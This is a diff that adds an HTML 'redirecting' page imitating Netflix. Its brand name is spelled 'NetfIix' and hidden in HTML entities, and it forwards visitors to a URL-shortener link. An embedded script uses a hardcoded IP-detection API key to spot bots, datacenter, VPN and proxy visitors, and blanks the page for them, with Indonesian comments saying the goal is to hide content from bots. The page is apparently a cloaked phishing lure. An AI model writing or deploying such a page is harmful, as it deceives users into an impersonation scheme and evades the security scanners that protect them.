@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background: #ffffff; /* Putih Netflix */
+      color: #000000;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    .loader {
+      width: 6vmin;
+      height: 6vmin;
+      border: 0.35vmin solid transparent;
+      border-top: 0.35vmin solid #e50914;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 3vmin;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .fade-in {
+      opacity: 0;
+      animation: fadeIn 1.2s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+
+    h1 {
+      font-size: 4.5vmin;
+      margin: 0 0 2vmin;
+      color: #000;
+    }
+
+    p {
+      color: #333;
+      font-size: 3vmin;
+      margin: 0.5vmin 0;
+    }
+
+    a {
+      color: #e50914;
+      text-decoration: underline;
+    }
+
+    @media (min-width: 768px) {
+      .loader {
+        width: 50px;
+        height: 50px;
+        border: 2.5px solid transparent;
+        border-top: 2.5px solid #e50914;
+      }
+      h1 { font-size: 24px; }
+      p { font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h1 class="fade-in" style="animation-delay: 0.3s;">Just a moment...</h1>
+  <p class="fade-in" style="animation-delay: 0.8s;">
+    You are being redirected to <b>&#x4e;&#x65;&#x74;&#x66;&#x49;&#x69;&#x78;.</b>
+  </p>
+  <p class="fade-in" style="animation-delay: 1.3s;">
+    If this page does not load automatically, 
+    <a href="#" onclick="window.location.href='https://o2o.to/i/mJ5NvY'; return false;">
+      <b>click here</b>
+    </a>.
+  </p>
+
+  <script>
+    (function() {
+      const TARGET_URL = "https://o2o.to/i/mJ5NvY";
+      const API_KEY = "e8035f4f-bdb7-4fbc-aaca-ba226fa2c064";
+      const TIMEOUT_MS = 2000;
+
+      function redirect(url) {
+        setTimeout(() => window.location.href = url, 100);
+      }
+
+      async function detectVisitor() {
+        try {
+          const res = await fetch("https://api.ipdetective.io/ip?info=true", {
+            headers: { "x-api-key": API_KEY }
+          });
+          if (!res.ok) throw new Error("ipdetective error");
+          const data = await res.json();
+          const badTypes = ["datacenter", "bot", "vpn", "proxy"];
+          const isBot = data.bot === true || badTypes.includes((data.type || "").toLowerCase());
+          return { ok: true, isBot, raw: data };
+        } catch (e) {
+          return { ok: false, error: e };
+        }
+      }
+
+      (async function() {
+        const result = await Promise.race([
+          detectVisitor(),
+          new Promise(resolve => setTimeout(() => resolve({ ok: false, timeout: true }), TIMEOUT_MS))
+        ]);
+
+        if (result.ok && result.isBot) {
+          // Sembunyikan konten total agar bot tidak lihat tampilan
+          document.body.innerHTML = "";
+          // Redirect cepat tanpa delay visual
+          window.location.replace("about:blank");
+          return;
+        }
+
+        // Kalau bukan bot, lanjut redirect normal
+        redirect(TARGET_URL);
+      })();
+    })();
+  </script>
+</body>
+</html>
